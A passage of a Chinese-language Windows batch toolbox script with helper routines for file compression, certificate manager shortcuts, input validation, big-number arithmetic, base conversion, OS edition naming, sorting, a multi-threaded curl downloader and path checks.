if "%3" equ ".mpg" goto :eof
if "%3" equ ".gif" goto :eof
if "%3" equ ".zip" goto :eof
if "%3" equ ".rar" goto :eof
if "%3" equ ".7z" goto :eof
if "%3" equ ".png" goto :eof
if "%3" equ ".jpg" goto :eof
if "%3" equ ".jpeg" goto :eof
if "%3" equ ".wmf" goto :eof
if "%3" equ ".wmv" goto :eof
if "%3" equ ".bik" goto :eof
if "%3" equ ".bk2" goto :eof
if "%3" equ ".mp3" goto :eof
if "%3" equ ".acc" goto :eof
if "%3" equ ".m4a" goto :eof
if "%3" equ ".flac" goto :eof
if "%3" equ ".ape" goto :eof
if "%3" equ ".mp4" goto :eof
if "%3" equ ".avi" goto :eof
if "%3" equ ".flv" goto :eof
if "%3" equ ".f4v" goto :eof
if "%3" equ ".mkv" goto :eof
if "%3" equ ".3gp" goto :eof
if "%3" equ ".cab" goto :eof
if "%3" equ ".pdf" goto :eof
if %2 lss 4096 goto :eof
compact /c /exe:lzx %1
goto :eof
:75
setlocal
cls
title 打开证书管理单元!system!
set "cho=120"
!hx!
echo;[1]certmgr	[证书 - 当前用户]
echo;[2]certlm	[证书 - 本地计算机]
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (start certmgr.msc&goto memuv2)
if "!shuru!" equ "2" (start certlm.msc&goto memuv2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
endlocal
goto 75
:checkvar
setlocal
if "%1" equ "" (
	goto :eof
) else (
	set "val=!%1!"
)
if "%2" equ "num" (goto checkvar_num)
if "%2" equ "num." (goto checkvar_num.)
if "%2" equ "-num" (goto checkvar_-num)
if "%2" equ "-num." (goto checkvar_-num.)
if "%2" equ "az" (goto checkvar_az)
if "%2" equ "aznum" (goto checkvar_aznum)
goto :eof
:checkvar_num
if defined %1 (
	for /f "delims=0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=1"
	goto :eof
) else (
	echo;1
	goto :eof
)
goto :eof
:checkvar_num.
if defined %1 (
	for /f "delims=.0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1,2 delims=." %%a in ("!%1!") do (
	if "%%a" neq "" (
		set "val1=%%a"
	) else (
		set "val1=0"
	)
	if "%%b" neq "" (
		set "val2=%%b"
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
if "!val1!!val2!" neq "" (
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
goto :eof
:checkvar_-num
if defined %1 (
	for /f "delims=0123456789-" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1 delims=-" %%a in ("!%1!") do (
	if "!%1:~0,1!" equ "-" (
		if "%3" neq "" (
			endlocal&set "%3=1"
			goto :eof
		) else (
			echo;1
			goto :eof
		)
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
goto :eof
:checkvar_-num.
set "val1=!val:~1!"
set "val2=!val:.=!"
if defined val1 (
	call :checkvar val1 num. jg
	if "!jg!" equ "1" (
		call :checkvar val2 -num jg
		if "!jg!" equ "1" (
			if "%3" neq "" (
				endlocal&set "%3=1"
				goto :eof
			) else (
				echo;1
				goto :eof
			)
		)
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)
goto :eof
:checkvar_az
if defined %1 (
	for /f "delims=abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
goto :eof
:checkvar_aznum
if defined %1 (
	for /f "delims=0123456789abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)
goto :eof
:sqrt
setlocal
set s=%1
set w=%2
if defined W (for /l %%i in (1 1 %W%) do set "s=!s!00") else set W=0
set p=!s!&set /a len=N=0
for %%i in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do IF "!p:~%%i!" NEQ "" set/a len+=%%i&set "p=!p:~%%i!"
set /a "N-=~(len%%2)"
set M=!s:~,%N%!
for /l %%i in (1 1 9) do set/a Mx=%%i*%%i&if !Mx! leq !M! set/a "i=%%i,j=100+M-Mx"
set /a "len-=1,Len_i=_N=i/5+1,p=i*20"
set j=!j:~-%_N%!&set p=0!p!&set kl=0000000
set /a _N=8-_N
for /l %%i in (%N% 2 !len!) do (
set "j=!j!!s:~%%i,2!"
if "!j:0=!" neq "" (
set /a Ln_i=Len_i+=2
if "!p!" lss "!j!" (
set d=Z&set in=!kl!!P!&set /a Ln_i+=7
for /l %%j in (9 -1 2) do (
if "!d!" gtr "!j!" (
set "x=%%j"
set d=&set /a "b=x*x"
for /l %%k in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%k,8!*%%j+b"
set d=!b:~-8!!d!&set /a "b=!b:~,-8!-%%j"
)
set d=!b!!d!
for %%k in (!Len_i!) do set "d=!d:~-%%k!"
)
)
if "!d!" gtr "!j!" (set d=!in!&set x=1&set b=1) else set d=!kl!!d!&set b=0
set j=!kl!!j!&set "t="
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=3!j:~-%%j,8!-1!d:~-%%j,8!-!b:~,1!%%2"
set "t=!b:~1!!t!"
)
for %%j in (!Len_i!) do set "j=!t:~-%%j!"
set "j=!j:~1!") else set "x=0"
set /a "Len_i-=1"
if "!x!" neq "0" (
if "!x!" geq "5" (
set p=&set b=0&set "in=!kl!!i!!x!"
set /a "Ln_i=Len_i+_N"
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%j,8!*2+!b:~,1!%%2"
set p=!b:~1!!p!
)
set /a "b=!b:~,1!%%2"
for %%j in (!Len_i!) do set "p=!b:1=01!!p:~-%%j!0"
) else set /a t=x*2&set "p=!p:~,-1!!t!0"
) else set p=!p!0&set "j=!j:~1!"
) else set j=!j:~1!&set p=!p!0&set /a "Len_i+=1,x=0"
set i=!i!!x!
)
for /f "tokens=* delims=." %%i in ("!i:~,-%W%!.!i:~-%W%!") do (endlocal&set %3=%%i)
goto :eof
:10to16
setlocal
set "ran=%1"
:10to16_1
set /a "s=!ran!%%16"
if !s! lss 10 goto 10to16_3
if !s! gtr 12 goto 10to16_2
if "!s!" equ "10" set "s=A"&goto 10to16_3
if "!s!" equ "11" set "s=B"&goto 10to16_3
if "!s!" equ "12" set "s=C"&goto 10to16_3
:10to16_2
if "!s!" equ "13" set "s=D"&goto 10to16_3
if "!s!" equ "14" set "s=E"&goto 10to16_3
if "!s!" equ "15" set "s=F"&goto 10to16_3
:10to16_3
set "jg=!s!!jg!"
set /a "ran/=16"
if !ran! neq 0 goto 10to16_1
if "%2" neq "" (
	endlocal&set "%2=%jg%"
) else (
	endlocal&echo;%jg%
)
goto :eof
:10to2
setlocal
set "num=%1"
:10to2_1
set /a "e=num%%2"
set /a "num/=2"
set "num1=!e!!num1!"
if !num! neq 0 goto 10to2_1
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo;%num1%
)
goto :eof
:10to8
setlocal
set "num=%1"
:10to8_2
set /a "b=num%%8"
set /a "num/=8"
set "num1=!b!!num1!"
if !num! neq 0 goto 10to8_2
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo;%num1%
)
goto :eof
:2to10
setlocal
set nn=
set "nnn=1"
set "n=%1"
set "n=!n:0= 0!"
set "n=!n:1= 1!"
for %%a in (!n!) do (
	set "nn=%%a !nn!"
)
for %%a in (!nn!) do (
	set /a "num+=%%a*nnn,nnn*=2"
)
if "%2" neq "" (
	endlocal&set "%2=%num%"
) else (
	endlocal&echo;%num%
)
goto :eof
:calc
setlocal
set a=%~1.0
set b=%~3.0
for /f "tokens=1,2 delims=." %%a in ("%a:-=%") do set "a_1=%%a"&set "a_2=%%b"
for /f "tokens=1,2 delims=." %%a in ("%b:-=%") do set "b_1=%%a"&set "b_2=%%b"
call :strlenx %a_1% L1_1
call :strlenx %a_2% L1_2
call :strlenx %b_1% L2_1
call :strlenx %b_2% L2_2
for %%i in (1 2) do (
    set "zero="&set m=0
    if !L1_%%i! leq !L2_%%i! (
        set /a m=L2_%%i-L1_%%i
        if !m! neq 0 (
            for /l %%a in (1 1 !m!) do set zero=!zero!0
		)
        if "%%i" equ "1" (set a_%%i=!zero!!a_%%i!) else set a_%%i=!a_%%i!!zero!
        set Len_%%i=!L2_%%i!
	) else (
        set /a m=L1_%%i-L2_%%i
        for /l %%a in (1 1 !m!) do set zero=!zero!0
        if "%%i" equ "1" (set b_%%i=!zero!!b_%%i!) else set b_%%i=!b_%%i!!zero!
        set Len_%%i=!L1_%%i!
	)
)
set /a Len=Len_1+Len_2+1
if "%~2" equ "+" (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
		) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
		)
	) else (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
		) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
		)
	)
) else (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
		) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
		)
	) else (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
		) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
		)
	)
)
goto :eof
:strlenx
setlocal
set "$=%1#"
set len=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. neq . set/a len+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/a len+=0x!$:~16,1!
endlocal&set %2=%len%&goto :eof
:jia
setlocal
set a=%~1
set b=%~2
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
	) else (
        set /a "c=t+!a:~%%a,1!+!b:~%%a,1!"
        if !c! geq 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
	)
)
if %t% equ 1 (set s=1!s!)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=1* delims=0" %%c in (".%%b") do if "%%c%%d" equ "." set s=%%a
)
endlocal&set %~4=%s%&goto :eof
:jian
setlocal
if %~1 lss %~2 (
    set a=%~2
    set b=%~1
) else (
    set a=%~1
    set b=%~2
)
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
	) else (
        set /a "c=10+!a:~%%a,1!-!b:~%%a,1!-t"
        if !c! lss 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
	)
)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=* delims=0" %%c in ("%%a") do if "%%c" equ "" (set pre=0) else set pre=%%c
    for /f "tokens=* delims=0" %%c in ("%%b") do if "%%c" equ "" (set s=!pre!) else set s=!pre!.%%b
)
endlocal&set %~4=%s%&goto :eof
:pdxp
if /i "!system!" equ "Microsoft Windows XP Home" (set "system= - Windows XP 家庭版"&goto :eof)
if /i "!system!" equ "Microsoft Windows XP Professional" (set "system= - Windows XP 专业版"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd7
if /i "!system!" equ "Microsoft Windows 7 Ultimate" (set "system= - Windows 7 旗舰版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Home Basic" (set "system= - Windows 7 家庭普通版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Home Premium" (set "system= - Windows 7 家庭高级版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Professional" (set "system= - Windows 7 专业版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 7 Enterprise" (set "system= - Windows 7 企业版"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd8
if /i "!system!" equ "Microsoft Windows 8 Pro" (set "system= - Windows 8 专业版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8 China" (set "system= - Windows 8 中国版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8 Enterprise" (set "system= - Windows 8 企业版"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd8.1
if /i "!system!" equ "Microsoft Windows 8.1 Pro" (set "system= - Windows 8.1 专业版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8.1 China" (set "system= - Windows 8.1 中国版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 8.1 Enterprise" (set "system= - Windows 8.1 企业版"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd10
if /i "!system!" equ "Microsoft Windows 10 Home" (set "system= - Windows 10 家庭版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 10 Professional" (set "system= - Windows 10 专业版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 10 Education" (set "system= - Windows 10 教育版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 10 Enterprise" (set "system= - Windows 10 企业版"&goto :eof)
set "system= - !system:~10!"
goto :eof
:pd11
if /i "!system!" equ "Microsoft Windows 11 Home" (set "system= - Windows 11 家庭版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 11 Professional" (set "system= - Windows 11 专业版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 11 Education" (set "system= - Windows 11 教育版"&goto :eof)
if /i "!system!" equ "Microsoft Windows 11 Enterprise" (set "system= - Windows 11 企业版"&goto :eof)
set "system= - !system:~10!"
goto :eof
:sortaz
setlocal
for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=!p.ok! %%i")
endlocal&set %~2=%p.ok:~1%&goto :EOF
:sortza
setlocal
for /f "delims==" %%a in ('set p. 2^>nul')do set "%%a="
for /l %%a in (1 1 20) do set "p.lin=0000000000!p.lin!"
for %%a in (%~1) do (set s=!p.lin!%%a&set "s=!s:~-200!"
if defined p...!s! (set p..%%a=!p..%%a! %%a
set p...!s!=!p..%%a! %%a) else (set p...!s!=%%a))
for /f "tokens=2 delims==" %%a in ('set p...') do (
for %%i in (%%a) do set "p.ok=%%i !p.ok!")
endlocal&set %~2=%p.ok%&goto :EOF
:checkmem
setlocal
if "%1" equ "" (goto :eof)
if "%2" equ "" (goto :eof)
if "%3" equ "" (goto :eof)
for /f "tokens=2 delims==" %%a in ('"wmic OS get FreePhysicalMemory /Value"') do (
	set "mem=%%a"
	set "mem=!mem:~0,-1!"
	if !mem! %1 %2 (
		endlocal&set "%3=1"
	) else (
		endlocal&set "%3=0"
	)
)
goto :eof
:xcf
setlocal
set "num1=%1"
set "num2=%2"
if "!num1!" equ "" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num1!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num1!") do (
		set "num1a=%%a"
		set "num1b=%%b"
	)
)
if "!num1a!" equ "0" (set "num1a=")
:xcf_loop1
if "!num1b:~-1!" equ "0" (
	set "num1b=!num1b:~0,-1!"
	goto xcf_loop1
)
if "!num1b!" equ "" (
	set dot1=0
) else (
	call :strlen num1b dot1
)
if "!num2!" equ "0" (
	goto :eof
) else (
	for /f "delims=-.0123456789" %%a in ("!num2!") do (
		goto :eof
	)
	for /f "tokens=1,2 delims=." %%a in ("!num2!") do (
		set "num2a=%%a"
		set "num2b=%%b"
	)
)
if "!num2a!" equ "0" (set "num2a=")
:xcf_loop2
if "!num2b:~-1!" equ "0" (
	set "num2b=!num2b:~0,-1!"
	goto xcf_loop2
)
if "!num2b!" equ "" (
	set dot2=0
) else (
	call :strlen num2b dot2
)
set /a "dot=dot1+dot2"
set /a "num=!num1a!!num1b!*!num2a!!num2b!"
set "numa=!num:~0,-%dot%!"
set "numb=!num:~-%dot%!"
:xcf_loop
if "!numb:~-1!" equ "0" (
	set "numb=!numb:~0,-1!"
	goto xcf_loop
)
if "!dot!" neq "0" (set "num=!numa!.!numb!")
if "!num:~-1!" equ "." (set "num=!num:~0,-1!")
if "!num:~0,1!" equ "." (set "num=!num:.=0.!")
if "!num:~0,2!" equ "-." (set "num=-0.!num:~2!")
if "%3" neq "" (
	endlocal&set "%3=%num%"
	goto :eof
) else (
	echo;!num!
	goto :eof
)
:scf
setlocal
if "%~1" equ "0" Endlocal&set %~3=0&goto :EOF
if "%~2" equ "0" Endlocal&set %~3=0&goto :EOF
set f=&set jia=&set ji=&set /a n1=0,n2=0
set vard1=&set "vard2="&set var1=%~1&set "var2=%~2"
for /l %%a in (0 1 9) do (
set var1=!var1:%%a= %%a !&set var2=!var2:%%a= %%a !)
for %%a in (!var1!)do (set /a n1+=1&set vard1=%%a !vard1!)
for %%a in (!var2!)do (set /a n2+=1&set vard2=%%a !vard2!)
if !n1! gtr !n2! (set vard1=%vard2%&set vard2=%vard1%)
for %%a in (!vard1!) do (set "t="&set /a j=0
for %%b in (!vard2!) do (if "!jia!" equ "" set /a jia=0
set /a a=%%a*%%b+j+!jia:~-1!&set "t=!a:~-1!!t!"
set a=0!a!&set "j=!a:~-2,1!"&set jia=!jia:~0,-1!)
set "ji=!t:~-1!!ji!"
if "!j:~0,1!" equ "0" (set ss=) else set "ss=!j:~0,1!"
set jia=!ss!!t:~0,-1!)
if not "!j:~0,1!" equ "0" set "t=!j:~0,1!!t!"
set "ji=!t!!ji:~1!"
Endlocal&set %~3=%ji%&goto :EOF
:convertu
setlocal
if "%1" equ "" (goto :eof)
set "tmp=%1"
set "tmp=!tmp:a=A!"
set "tmp=!tmp:b=B!"
set "tmp=!tmp:c=C!"
set "tmp=!tmp:d=D!"
set "tmp=!tmp:e=E!"
set "tmp=!tmp:f=F!"
set "tmp=!tmp:g=G!"
set "tmp=!tmp:h=H!"
set "tmp=!tmp:i=I!"
set "tmp=!tmp:j=J!"
set "tmp=!tmp:k=K!"
set "tmp=!tmp:l=L!"
set "tmp=!tmp:m=M!"
set "tmp=!tmp:n=N!"
set "tmp=!tmp:o=O!"
set "tmp=!tmp:p=P!"
set "tmp=!tmp:q=Q!"
set "tmp=!tmp:r=R!"
set "tmp=!tmp:s=S!"
set "tmp=!tmp:t=T!"
set "tmp=!tmp:u=U!"
set "tmp=!tmp:v=V!"
set "tmp=!tmp:w=W!"
set "tmp=!tmp:x=X!"
set "tmp=!tmp:y=Y!"
set "tmp=!tmp:z=Z!"
if "%2" neq "" (
	endlocal&set "%2=%tmp%"
	goto :eof
) else (
	echo;!tmp!
	goto :eof
)
:convertl
setlocal
if "%1" equ "" (goto :eof)
set "tmp=%1"
set "tmp=!tmp:A=a!"
set "tmp=!tmp:B=b!"
set "tmp=!tmp:C=c!"
set "tmp=!tmp:D=d!"
set "tmp=!tmp:E=e!"
set "tmp=!tmp:F=f!"
set "tmp=!tmp:G=g!"
set "tmp=!tmp:H=h!"
set "tmp=!tmp:I=i!"
set "tmp=!tmp:J=j!"
set "tmp=!tmp:K=k!"
set "tmp=!tmp:L=l!"
set "tmp=!tmp:M=m!"
set "tmp=!tmp:N=n!"
set "tmp=!tmp:O=o!"
set "tmp=!tmp:P=p!"
set "tmp=!tmp:Q=q!"
set "tmp=!tmp:R=r!"
set "tmp=!tmp:S=s!"
set "tmp=!tmp:T=t!"
set "tmp=!tmp:U=u!"
set "tmp=!tmp:V=v!"
set "tmp=!tmp:W=w!"
set "tmp=!tmp:X=x!"
set "tmp=!tmp:Y=y!"
set "tmp=!tmp:Z=z!"
if "%2" neq "" (
	endlocal&set "%2=%tmp%"
	goto :eof
) else (
	echo;!tmp!
	goto :eof
)
:curldxc
setlocal
if not exist "%systemroot%\system32\curl.exe" (
	if not exist .\curl.exe (
		echo;没有找到curl.exe
		goto :eof
	)
)
set "url=%1"
set "tr=%2"
set "filename=%3"
set "dir=%4"
set "par=%5"
set "ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
if not defined url (
	echo;链接不能为空!
	goto :eof
)
if not defined tr (set tr=8)
set tr|findstr "\<[0-9]*\>">nul
if "!errorlevel!" neq "0" (
	echo;线程数只能输入数字!
	goto :eof
)
if not defined dir (
	for /f "delims=" %%a in ("%0") do (set "dir=%%~dpa")
)
if not exist "!dir!" (
	echo;路径 !dir! 不存在
	goto :eof
)
dir /ad "!dir!">nul 2>nul||(
	echo;路径 !dir! 不是一个文件夹
	goto :eof
)
if exist "%temp%\tag" (del /f /q "%temp%\tag")
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
curl !proxy! !doh! !par! -A "!ua!" --compressed -I -# -L -o tag --connect-timeout 5 --output-dir "%temp%" "!url!"
if not exist "%temp%\tag" (
	echo;没有获取到文件信息
	goto :eof
)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Accept-Ranges:"') do (set "trflag=%%a")
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Content-Length:"') do (set "filesize=%%a")
for /f "tokens=2 delims==" %%a in ('type %temp%\tag^|findstr /c:"filename="') do (set "filename=%%a")
if "!trflag!" neq "bytes" (set tr=1)
if not defined filename (set "filename=%3")
if not defined filesize (goto curldxc_3)
set /a "fd=filesize/tr"
set /a "ys=filesize%%tr"
set oldfd=0
set /a "pdtr=tr-1"
set /a "newfd=fd-1"
set /a "pdfd=fd+ys"
set file=
for /l %%a in (1,1,!tr!) do (set "file=!file!%%a+")
set newtr=
set /a "newtr=tr+1"
set "file=!file:~0,-1!"
if exist "%temp%\down" (rd /s /q "%temp%\down")
md "%temp%\down"
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
for /l %%a in (1,1,!tr!) do (
	start /b /low "curl多进程下载_!tr!" curl !proxy! !doh! !par! -s -A "!ua!" --compressed -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir "%temp%\down" "!url!"
	set /a "oldfd=newfd+1"
	if "%%a" equ "!pdtr!" (
		set newfd=
	) else (
		set /a "newfd=oldfd+fd-1"
	)
)
pushd "%temp%\down"
:curldxc_2
set 次数=
for /l %%a in (1,1,!tr!) do (
	if "%%a" equ "!tr!" (
		if "%%~za" equ "!pdfd!" (
			echo;进程%%a完成
			set /a "次数+=1"
		)
	) else (
		if "%%~za" equ "!fd!" (
			echo;进程%%a完成
			set /a "次数+=1"
		)
	)
)
timeout /t 1 /nobreak>nul
if "!次数!" neq "!tr!" (goto curldxc_2)
if "!dir:~-1!" neq "\" (set "dir=!dir!\")
copy /b /z !file! "!dir!!filename!"
popd
rd /s /q "%temp%\down"
del /f /q "%temp%\tag"
goto :eof
:curldxc_3
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
if "!dir:~-1!" equ "\" (set "dir=!dir:~0,-1!")
curl !proxy! !doh! -A "!ua!" --compressed -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o "!filename!" --output-dir "!dir!" "!url!"
goto :eof
:pwiex
powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('"%weizhi%"') -split '#%1\#.*'; iex ($command[1])"
goto :eof
:out
if exist "!systemroot!\system32\timeout.exe" (
	timeout /t %1 /nobreak>nul
) else (
	ping /n %1 0.0>nul
)
goto :eof
:lj
setlocal
for /f "delims=" %%a in ("!%1!") do (
	set "var=%%~fa"
	if "!var:~-1!" equ "\" (set "var=!var:~0,-1!")
)
endlocal&set "%2=%var%"
goto :eof
:ljjc
setlocal
if "!%1!" equ "" (exit /b 0)
for /f "delims=" %%a in ("!%1!") do (
	set "var=%%~fa"
	if "!var:~-1!" equ "\" (set "var=!var:~0,-1!")
	if not exist "!var!" (exit /b 0)
)
if "%2" equ "dir" (
	if exist "!var!\" (
		endlocal&set "%1=%var%"
		exit /b 1
	) else (
		exit /b 0
	)
) else (
	if exist "!var!\" (
		exit /b 0
	) else (
		endlocal&set "%1=%var%"
		exit /b 1
	)
)
